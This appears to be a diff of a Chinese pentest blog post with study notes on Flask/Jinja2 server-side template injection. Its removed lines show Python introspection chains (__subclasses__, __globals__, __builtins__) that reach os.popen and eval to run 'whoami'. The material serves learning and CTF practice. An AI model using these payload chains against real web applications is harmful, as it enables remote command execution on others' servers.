@@ -1,262 +1,124 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content="我的个人博客，主要用于记录自己的一些渗透测试、编程等学习笔记之类的东西。"/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>Flask 模版注入（SSTI） | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>Flask 模版注入（SSTI）</h1>
-      
-<div class="post-meta">
-    <time>2021-07-11</time>
-    (update <time>2024-05-23</time>)
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/python">python</a>,<a href="/tags/ctf">ctf</a>,<a href="/tags/rce">rce</a>)
-</div>
-
-      <div><h3 id="0x00-ssti-模版注入">0x00 SSTI 模版注入</h3>
-<p>SSTI 模版注入一般都是先找到执行命令的模块模块，然后执行（可以用工具 tplmap）</p>
-<p>一般步骤：<br>
-1、某种类型 (字符串:&quot;&quot;，list:[]，int：1) 开始引出<br>
-2、<code>__class__</code> 找到当前类<br>
-3、<code>__mro__</code> 或者 <code>__base__</code> 或者 <code>__bases__</code> 找到根类 <code>__object__</code><br>
-4、然后利用 <code>__subclasses__</code> 拿到子类列表<br>
-5、然后在子类列表 <code>__init__.__globals__.keys()</code> 找到类似 popen 能执行命令的函数</p>
-<h3 id="0x01-python3-例子">0x01 python3 例子</h3>
-<ul>
-<li>
-<p>当前类</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># __class__ 返回对象所属类</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">str</span><span style="color:#e6db74">&#39;&gt;</span>
-</span></span></code></pre></div></li>
-<li>
-<p>获取 object 根类</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># __mro__、__bases__ 都可以返回继承链关系</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__mro__
-</span></span><span style="display:flex;"><span>(<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">str</span><span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>object<span style="color:#e6db74">&#39;&gt;)</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__
-</span></span><span style="display:flex;"><span>(<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">object</span><span style="color:#e6db74">&#39;&gt;,)</span>
-</span></span></code></pre></div></li>
-<li>
-<p>获取子类列表</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># __subclasses__() 以列表返回类的所有子类</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__mro__[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>__subclasses__()
-</span></span><span style="display:flex;"><span>[<span style="color:#f92672">&lt;</span>type <span style="color:#e6db74">&#39;type&#39;</span><span style="color:#f92672">&gt;</span>,
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>type <span style="color:#e6db74">&#39;weakref&#39;</span><span style="color:#f92672">&gt;</span>,
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>type <span style="color:#e6db74">&#39;weakcallableproxy&#39;</span><span style="color:#f92672">&gt;</span>,
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>type <span style="color:#e6db74">&#39;super&#39;</span><span style="color:#f92672">&gt;</span>,
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>type <span style="color:#e6db74">&#39;dict&#39;</span><span style="color:#f92672">&gt;</span>,
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>type <span style="color:#e6db74">&#39;set&#39;</span><span style="color:#f92672">&gt;</span>,
-</span></span><span style="display:flex;"><span><span style="color:#f92672">......</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">......</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">site</span><span style="color:#f92672">.</span>_Printer<span style="color:#e6db74">&#39;&gt;,</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">site</span><span style="color:#f92672">.</span>_Helper<span style="color:#e6db74">&#39;&gt;,</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">site</span><span style="color:#f92672">.</span>Quitter<span style="color:#e6db74">&#39;&gt;,</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">codecs</span><span style="color:#f92672">.</span>IncrementalEncoder<span style="color:#e6db74">&#39;&gt;,</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">codecs</span><span style="color:#f92672">.</span>IncrementalDecoder<span style="color:#e6db74">&#39;&gt;]</span>
-</span></span></code></pre></div></li>
-<li>
-<p>通过 os.popen、os.system、subprocess.Popen 执行命令</p>
-<p>找到存在 popen、system 等可以执行命令的类</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#66d9ef">for</span> i,v <span style="color:#f92672">in</span> enumerate(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__()):
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>     <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>         <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;popen&#39;</span> <span style="color:#f92672">in</span> v<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__:
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>             print(i, v)
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>     <span style="color:#66d9ef">except</span>:
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>         <span style="color:#66d9ef">pass</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">154</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">os</span><span style="color:#f92672">.</span>_wrap_close<span style="color:#e6db74">&#39;&gt;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#66d9ef">for</span> i,v <span style="color:#f92672">in</span> enumerate(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__()):
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>     <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>         <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;Popen&#39;</span> <span style="color:#f92672">in</span> v<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__:
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>             print(i, v)
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>     <span style="color:#66d9ef">except</span>:
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>         <span style="color:#66d9ef">pass</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">250</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">subprocess</span><span style="color:#f92672">.</span>CompletedProcess<span style="color:#e6db74">&#39;&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">251</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">subprocess</span><span style="color:#f92672">.</span>Popen<span style="color:#e6db74">&#39;&gt;</span>
-</span></span></code></pre></div><p>通过 <code>__init__</code> 初始化类实例</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">154</span>]<span style="color:#f92672">.</span>__init__
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>function _wrap_close<span style="color:#f92672">.</span>__init__ at <span style="color:#ae81ff">0x1081df740</span><span style="color:#f92672">&gt;</span>
-</span></span></code></pre></div><p>通过 <code>__globals__</code> 拿到字典类型的内建模块，可以看到 popen</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__mro__[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">74</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__
-</span></span><span style="display:flex;"><span>{<span style="color:#e6db74">&#39;__name__&#39;</span>: <span style="color:#e6db74">&#39;os&#39;</span>, 
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;__doc__&#39;</span>: <span style="color:#e6db74">&#34;OS routines for...&#34;</span>, 
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;__package__&#39;</span>: <span style="color:#e6db74">&#39;&#39;</span>, 
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;__doc__&#39;</span>: <span style="color:#e6db74">&#34;Built-in function....&#34;</span>, 
-</span></span><span style="display:flex;"><span><span style="color:#f92672">......</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">......</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;__all__&#39;</span>: [
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;spawnv&#39;</span>, 
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;spawnve&#39;</span>, 
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;spawnvp&#39;</span>, 
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;spawnvpe&#39;</span>, 
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;popen&#39;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">......</span>
-</span></span><span style="display:flex;"><span>], 
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;fdopen&#39;</span>: <span style="color:#f92672">&lt;</span>function fdopen at <span style="color:#ae81ff">0x1081df6a0</span><span style="color:#f92672">&gt;</span>, 
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;_fspath&#39;</span>: <span style="color:#f92672">&lt;</span>function _fspath at <span style="color:#ae81ff">0x1081dfb00</span><span style="color:#f92672">&gt;</span>, 
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;PathLike&#39;</span>: <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">os</span><span style="color:#f92672">.</span>PathLike<span style="color:#e6db74">&#39;&gt;}</span>
-</span></span></code></pre></div><p>初始化后执行命令</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">154</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;popen&#39;</span>](<span style="color:#e6db74">&#39;whoami&#39;</span>)<span style="color:#f92672">.</span>read()
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;reber</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
-</span></span></code></pre></div></li>
-<li>
-<p>直接通过 os 模块执行命令</p>
-<p>其实上面的例子用的是 os 模块</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#66d9ef">for</span> i,v <span style="color:#f92672">in</span> enumerate(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__()):
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>     <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>         <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;os&#39;</span> <span style="color:#f92672">in</span> v<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__:
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>             print(i, v)
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>     <span style="color:#66d9ef">except</span>:
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>         <span style="color:#66d9ef">pass</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">158</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">_distutils_hack</span><span style="color:#f92672">.</span>_TrivialRe<span style="color:#e6db74">&#39;&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">232</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">contextlib</span><span style="color:#f92672">.</span>_GeneratorContextManagerBase<span style="color:#e6db74">&#39;&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">233</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">contextlib</span><span style="color:#f92672">.</span>_BaseExitStack<span style="color:#e6db74">&#39;&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">239</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">inspect</span><span style="color:#f92672">.</span>BlockFinder<span style="color:#e6db74">&#39;&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">242</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">inspect</span><span style="color:#f92672">.</span>Parameter<span style="color:#e6db74">&#39;&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">243</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">inspect</span><span style="color:#f92672">.</span>BoundArguments<span style="color:#e6db74">&#39;&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">244</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">inspect</span><span style="color:#f92672">.</span>Signature<span style="color:#e6db74">&#39;&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">250</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">subprocess</span><span style="color:#f92672">.</span>CompletedProcess<span style="color:#e6db74">&#39;&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">251</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">subprocess</span><span style="color:#f92672">.</span>Popen<span style="color:#e6db74">&#39;&gt;</span>
-</span></span></code></pre></div><p>执行命令</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">158</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;os&#39;</span>]<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;whoami&#39;</span>)<span style="color:#f92672">.</span>read()
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;reber</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
-</span></span></code></pre></div><p>这种方法<f>不准确</f>，因为一些不相关的类名中也存在字符串 &ldquo;os&rdquo;</p>
-</li>
-<li>
-<p>通过 <code>__builtins__</code> 执行命令</p>
-<p><code>__builtins__</code> 下有 eval、<code>__import__</code> 等函数</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#66d9ef">for</span> i,v <span style="color:#f92672">in</span> enumerate(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__()):
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>     <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>         <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;eval&#39;</span> <span style="color:#f92672">in</span> v<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;__builtins__&#39;</span>]:
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>             print(i, v)
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>     <span style="color:#66d9ef">except</span>:
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>         <span style="color:#66d9ef">pass</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">140</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">codecs</span><span style="color:#f92672">.</span>IncrementalEncoder<span style="color:#e6db74">&#39;&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">141</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">codecs</span><span style="color:#f92672">.</span>IncrementalDecoder<span style="color:#e6db74">&#39;&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">142</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">codecs</span><span style="color:#f92672">.</span>StreamReaderWriter<span style="color:#e6db74">&#39;&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">143</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">codecs</span><span style="color:#f92672">.</span>StreamRecoder<span style="color:#e6db74">&#39;&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">154</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">os</span><span style="color:#f92672">.</span>_wrap_close<span style="color:#e6db74">&#39;&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">_sitebuiltins</span><span style="color:#f92672">.</span>Quitter<span style="color:#e6db74">&#39;&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">163</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">warnings</span><span style="color:#f92672">.</span>WarningMessage<span style="color:#e6db74">&#39;&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">164</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">warnings</span><span style="color:#f92672">.</span>catch_warnings<span style="color:#e6db74">&#39;&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">191</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">reprlib</span><span style="color:#f92672">.</span>Repr<span style="color:#e6db74">&#39;&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">201</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">functools</span><span style="color:#f92672">.</span>partialmethod<span style="color:#e6db74">&#39;&gt;</span>
-</span></span></code></pre></div><p>通过第 140 个的类执行命令</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">140</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;__builtins__&#39;</span>][<span style="color:#e6db74">&#39;eval&#39;</span>](<span style="color:#e6db74">&#39;__import__(&#34;os&#34;).popen(&#34;whoami&#34;).read()&#39;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;reber</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">140</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;__builtins__&#39;</span>][<span style="color:#e6db74">&#39;__import__&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;whoami&#39;</span>)<span style="color:#f92672">.</span>read()
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;reber</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
-</span></span></code></pre></div></li>
-</ul>
-<p><strong>Reference(侵删)：</strong></p>
-<ul>
-<li><a href="https://xz.aliyun.com/t/12163?_blank">Flask基础及模板注入漏洞（SSTI）</a></li>
-<li><a href="https://www.cnblogs.com/chrysanthemum/p/12766783.html?_blank">SSTI的payload</a></li>
-<li><a href="https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/?_blank">Python 沙盒逃逸备忘</a></li>
-</ul>
-</div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="我的个人博客，主要用于记录自己的一些渗透测试、编程等学习笔记之类的东西。"><meta name=author content="Reber"><title>Flask 模版注入（SSTI） | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
